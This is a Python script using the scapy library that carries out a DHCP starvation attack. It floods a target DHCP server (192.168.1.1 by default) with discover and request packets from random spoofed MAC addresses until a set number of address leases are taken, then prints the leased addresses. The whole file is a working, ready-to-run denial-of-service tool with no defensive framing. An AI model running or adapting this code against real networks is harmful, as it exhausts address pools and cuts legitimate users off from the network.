from scapy.all import *
import time
from threading import Thread
from scapy.layers.dhcp import DHCP, BOOTP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import sys


class DhcpStarvationAttack:
    def __init__(self, dhcp_server, amount):
        self.mac = []
        self.ip_starved = []
        self.dhcp_server = dhcp_server
        self.amount = amount
        self.awaiting = False

    def send_discover(self, requested_addr):

        hwaddress = str(RandMAC())

        while hwaddress in self.mac:
            hwaddress = str(RandMAC())
        self.mac.append(hwaddress)

        # generate DHCP discover packet
        ether_layer = Ether(src=hwaddress, dst="ff:ff:ff:ff:ff:ff")
        ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
        udp_layer = UDP(sport=68, dport=67)
        bootp_layer = BOOTP(chaddr=hwaddress, xid=random.randint(1, 900000000), flags=0xFFFFFF)
        dhcp_layer = DHCP(options=[("message-type", "discover"),
                                   ("requested_addr", requested_addr),
                                   ("client_id", hwaddress),
                                   ("end", "0")])

        pkt = ether_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer

        sendp(pkt, verbose=False)

        print("[ >> ] - SENDING NEW DISCOVER ")

        self.awaiting = True

        # luisterd naar DHCP responces

    def dhcp_sniffer(self):
        sniff(filter="udp and (port 67 or port 68)", prn=self.handler_dhcp,
              store=0)

    # kijkt wat voor DHCP packet het is
    def handler_dhcp(self, pkt):
        if pkt[DHCP]:
            if pkt[DHCP].options[0][1] == 2:
                # generate DHCP request packet dependent of the offer that has been sended by the DHC server
                ether_layer = Ether(src=pkt[BOOTP].chaddr.decode("utf-8"), dst="ff:ff:ff:ff:ff:ff")
                ip_layer = IP(src="0.0.0.0", dst="255.255.255.255")
                udp_layer = UDP(sport=68, dport=67)
                bootp_layer = BOOTP(chaddr=pkt[BOOTP].chaddr.decode("utf-8"), xid=pkt[BOOTP].xid, flags=0xFFFFFF)
                dhcp_layer = DHCP(options=[("message-type", "request"),
                                           ("requested_addr", pkt[BOOTP].yiaddr),
                                           ("server_id", pkt[DHCP].options[1][1]),
                                           "end", "0"])

                pkt = ether_layer / ip_layer / udp_layer / bootp_layer / dhcp_layer

                sendp(pkt, verbose=False)

                print("[ >> ] - SENDING OFFER ")

            elif pkt[DHCP].options[0][1] == 5:
                self.ip_starved.append(pkt[BOOTP].yiaddr)
                self.awaiting = False

                print("[ * ] - PACKET ACKNOWLEDGED\n")

            elif pkt[DHCP].options[0][1] == 6:
                self.awaiting = False

                print("[ ! ] - PACKET NOT ACKNOWLEDGED\n")

    def run(self):
        thread = Thread(target=self.dhcp_sniffer)
        thread.start()

        start = time.time()

        try:
            while len(self.ip_starved) < self.amount:
                if self.awaiting is False:
                    self.send_discover(self.dhcp_server)
                    start = time.time()

                elif time.time() - start > 10:
                    print("[ ! ] - TIME OUT\n")

                    self.send_discover(self.dhcp_server)
                    start = time.time()

            print(f""" DHCP STARVER HAS FINISHED \n
            
            TARGET SERVER:          {self.dhcp_server}
            MAC ADDRESSES TRIED:    {" , ".join(self.mac)}
            IP  ADDRESSES LEASED:   {" , ".join(self.ip_starved)}
            
            
            
            """)

        except KeyboardInterrupt:
            print("[ EXIT ] CTRL + C DETECTED")


if __name__ == '__main__':
    target = '192.168.1.1'
    number = 20

    test = DhcpStarvationAttack(target, number)
    test.run()
